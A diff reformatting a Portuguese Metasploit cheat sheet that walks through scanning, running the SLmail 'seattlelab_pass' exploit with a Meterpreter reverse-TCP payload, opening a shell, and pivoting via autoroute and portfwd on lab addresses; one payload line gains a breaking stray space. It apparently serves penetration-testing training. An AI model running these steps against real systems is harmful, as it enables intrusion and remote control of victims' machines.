@@ -2,83 +2,129 @@
 
 Ferramenta desenvolvida pela rapid7.com para auxiliar na criação e utilização de exploits.
 
-Iniciando MSF:
-service postgresql start
+Iniciando MSF:  
+```bash
+service postgresql start  
 msfconsole
+```
 
-Comando de ajuda:
+Comando de ajuda:  
+```
 msf > help
+```
 
-Verificando a conexão com o banco de dados:
+Verificando a conexão com o banco de dados:  
+```
 msf > db_status
+```
 
-Escaneamento de alvo salvando as informações no DB:
+Escaneamento de alvo salvando as informações no DB:  
+```
 msf > db_nmap -A 172.16.1.4
+```
 
-Importando arquivo XML do NMAP:
-nmap -v -A 172.16.1.5 -oX host5.xml
+Importando arquivo XML do NMAP:  
+```
+nmap -v -A 172.16.1.5 -oX host5.xml  
 msf > db_import host5.xml
+```
 
-Listagem dos hosts:
+Listagem dos hosts:  
+```
 msf > hosts
+```
 
-Verificando vulnerabilidade nos hosts:
+Verificando vulnerabilidade nos hosts:  
+```
 msf > vulns
+```
 
-Listagem de serviços:
+Listagem de serviços:  
+```
 msf > services
+```
 
-Buscando exploit:
+Buscando exploit:  
+```
 msf > search slmail
+```
 
-Usando exploit:
+Usando exploit:  
+```
 msf > use exploit/windows/pop3/seattlelab_pass
+```
 
-Ver informações do exploit:
+Ver informações do exploit:  
+```
 msf exploit(seattlelab_pass) > info
+```
 
-Setando parâmetros no exploit:
+Setando parâmetros no exploit:  
+```
+msf exploit(seattlelab_pass) > show options  
+msf exploit(seattlelab_pass) > set RHOST 172.16.1.4  
 msf exploit(seattlelab_pass) > show options
-msf exploit(seattlelab_pass) > set RHOST 172.16.1.4
-msf exploit(seattlelab_pass) > show options
+```
 
-Verificando payloads disponíveis:
+Verificando payloads disponíveis:  
+```
 msf exploit(seattlelab_pass) > show payloads
+```
 
-Setando payload para ser utilizado:
-msf exploit(seattlelab_pass) > set payload windows/meterpreter/reverse_tcp
+Setando payload para ser utilizado:  
+```
+msf exploit(seattlelab_pass) > set payload windows/  meterpreter/reverse_tcp  
+msf exploit(seattlelab_pass) > show options  
+msf exploit(seattlelab_pass) > set LHOST 172.20.0.2  
+msf exploit(seattlelab_pass) > set LPORT 4444  
 msf exploit(seattlelab_pass) > show options
-msf exploit(seattlelab_pass) > set LHOST 172.20.0.2
-msf exploit(seattlelab_pass) > set LPORT 4444
-msf exploit(seattlelab_pass) > show options
+```
 
-Executando exploit:
-msf exploit(seattlelab_pass) > exploit
+Executando exploit:  
+```
+msf exploit(seattlelab_pass) > exploit  
 meterpreter > ipconfig
+```
 
-Verificando comandos no meterpreter:
+Verificando comandos no meterpreter:  
+```
 meterpreter > help
+```
 
-Abrindo o shell:
+Abrindo o shell:  
+```
 meterpreter > shell
+```
 
-Colocando meterpreter em segundo plano:
+Colocando meterpreter em segundo plano:  
+```
 meterpreter > background
+```
 
-Retomando meterpreter:
+Retomando meterpreter:  
+```
 msf > session -i 4
+```
 
-Exibindo módulos auxiliares:
+Exibindo módulos auxiliares:  
+```
 msf > show auxiliary
+```
 
-Utilizando um módulo auxiliar:
-msf > use auxiliary/scanner/smb/smb_version
-msf > show options
-msf > set RHOSTS 172.16.1.5
+Utilizando um módulo auxiliar:  
+```
+msf > use auxiliary/scanner/smb/smb_version  
+msf > show options  
+msf > set RHOSTS 172.16.1.5  
 msf > run
+```
 
-Criando rota da rede do alvo para a nossa máquina:
+Criando rota da rede do alvo para a nossa máquina:  
+```
 meterpreter > run autoroute -s 192.168.0.0/24
+```
 
-Criando redirecionamento de porta do alvo para a nossa máquina:
+Criando redirecionamento de porta do alvo para a nossa máquina:  
+```
 meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.0.101
+```
